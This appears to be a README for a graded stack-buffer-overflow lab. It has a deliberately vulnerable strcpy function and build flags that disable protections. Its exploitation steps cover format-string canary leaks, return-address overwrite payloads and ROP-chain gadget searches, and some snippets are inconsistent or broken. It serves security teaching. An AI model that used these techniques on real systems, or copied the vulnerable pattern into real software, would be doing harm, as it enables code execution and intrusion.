# Stack Buffer Overflow

## Vulnerability Overview

Stack buffer overflow occurs when a program writes more data to a stack-based buffer than it can hold, overwriting adjacent memory including saved return addresses, frame pointers, and local variables. This is one of the most classic and well-understood memory corruption vulnerabilities, enabling attackers to hijack control flow and execute arbitrary code.

## Attack Vector: Unchecked String Copy

**Brief Explanation**: The program uses unsafe functions like `strcpy()`, `gets()`, or unbounded `scanf()` to copy user input into fixed-size stack buffers without length validation.

**Key Characteristics:**
- Fixed-size stack buffers (e.g., `char buffer[64]`)
- Unbounded copy operations (`strcpy`, `gets`, `sprintf`)
- User-controlled input length
- Adjacent critical data (return addresses, function pointers)
- Different difficulty levels with varying protection mechanisms

**Vulnerable Code Pattern:**
```c
// Typical vulnerable pattern
void vulnerable_function(char *user_input) {
    char buffer[64];
    strcpy(buffer, user_input);  // VULNERABLE: No bounds checking
    // When user_input > 64 bytes, overwrites return address
}
```

**Protection Mechanisms by Level:**
- **Level 1 (Easy):** No protections (`-fno-stack-protector -z execstack -no-pie`)
- **Level 2 (Medium):** Stack canary enabled (`-fstack-protector`)
- **Level 3 (Hard):** Full protections (ASLR, NX, PIE) requiring ROP/ret2libc

## Build and Test Instructions

### Build
```bash
# Level 1 - Easy (no protections)
cd stack_overflow/level1_easy
make

# Level 2 - Medium (stack canary)
cd stack_overflow/level2_medium
make

# Level 3 - Hard (full mitigations)
cd stack_overflow/level3_hard
make
```

### Test
```bash
# Level 1 - Direct overflow
cd stack_overflow/level1_easy
./vulnerable "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"

# Level 2 - Trigger canary detection
cd stack_overflow/level2_medium
#### 1-Leak the Canary
./vulnerable leak "%7\$p"  # Leak canary value from stack position 7
#### 2- Craft Payload Preserving Canary
##### Payload structure: buffer[64] + canary[4] + padding[4] + return_addr[4]
payload = b'A' * 64           # Fill buffer
payload += leaked_canary      # Preserve canary (4 bytes)
payload += b'BBBB'            # Padding (saved EBP)
payload += admin_shell_addr   # Overwrite return address
#### 3- Execute the Exploit
./vulnerable overflow "$(python3 -c 'Payload()')"

# Level 3 - Information leak + ROP
cd stack_overflow/level3_hard
#### 1-Leak the Canary
./vulnerable leak
# Enter format string: %p %p %p %p %p %p %p %p
#### 2- Craft Payload Preserving Canary
#### 3- Execute the Exploit
./vulnerable overflow "$(python3 -c 'payload()')"
```

## Exploitation

**Level 1 - Easy (Direct Overwrite):**
```bash
# Calculate offset to return address
python3 -c 'from pwn import *; print(cyclic(200))' | ./vulnerable
# Find offset with cyclic_find() in GDB

# Overwrite return address to win() function
python3 -c 'import struct; print("A"*72 + struct.pack("<Q", 0x401196))' | ./vulnerable
```

**Level 2 - Medium (Canary Bypass):**
```bash
# Leak canary using format string or partial overwrite
./vulnerable '%7$p %9$p %11$p'  # Leak canary value

# Preserve canary in overflow payload
# payload = "A"*64 + leaked_canary + "A"*8 + ret_addr
```

**Level 3 - Hard (ROP Chain):**
```bash
# Find ROP gadgets
ROPgadget --binary vulnerable | grep "pop rdi"

# Build ROP chain: pop rdi; ret -> bin_sh_addr -> system_addr
# Requires ASLR bypass via information leak
```

**Expected Results:**
- **Easy:** Direct shell or win() function execution
- **Medium:** Stack smashing detected or successful canary bypass
- **Hard:** ROP chain execution bypassing all mitigations
